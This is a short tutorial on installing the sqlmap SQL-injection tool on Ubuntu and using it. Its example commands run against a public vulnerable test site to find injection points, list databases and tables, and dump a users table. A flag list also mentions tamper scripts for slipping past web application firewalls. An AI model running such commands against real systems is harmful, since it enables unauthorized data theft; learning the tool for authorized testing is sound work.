Installing and using `sqlmap` on Ubuntu can be done directly via the official APT package repository or by cloning the latest
source code from GitHub using Python 3.

---

**Step 1: Installation Methods**

**Method A: Via APT Package Manager (Recommended for simplicity)**

```bash
sudo apt update
sudo apt install sqlmap -y

```

**Method B: Via GitHub Repository (Recommended for the latest updates)**

```bash
sudo apt update && sudo apt install git python3 -y
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py --version

```

---

**Step 2: Basic Usage Examples**

**1. Test a URL Target (GET Parameter)** Automatically test parameters in a target URL and accept default prompts using
`--batch`:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch

```

**2. Enumerate Databases** List all available databases on the target server once an injection point is confirmed:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs

```

**3. Enumerate Tables from a Specific Database** Extract table names from a targeted database (e.g., `acuart`):

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables

```

**4. Dump Column Data from a Specific Table** Retrieve table columns and extract contents from a specific table (e.g.,
`users`):

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump

```

**5. Process Saved HTTP Requests (POST Requests & Headers)** Intercept a POST request (e.g., via Burp Suite), save it to a
file (`request.txt`), and pass it to `sqlmap`:

```bash
sqlmap -r request.txt --dbs

```

---

**Essential Command Flags Reference**

- `--batch`: Accepts non-interactive default answers during execution.
- `--risk=1..3`: Sets the risk level of testing payloads (default: 1; higher levels include heavy OR/AND-based updates).
- `--level=1..5`: Sets the depth of tests to perform (level 2+ tests HTTP Cookie headers, level 3+ tests User-Agent/Referer
  headers).
- `--tamper=...`: Applies obfuscation scripts (e.g., `space2comment`, `randomcase`) to bypass Web Application Firewalls
  (WAFs).
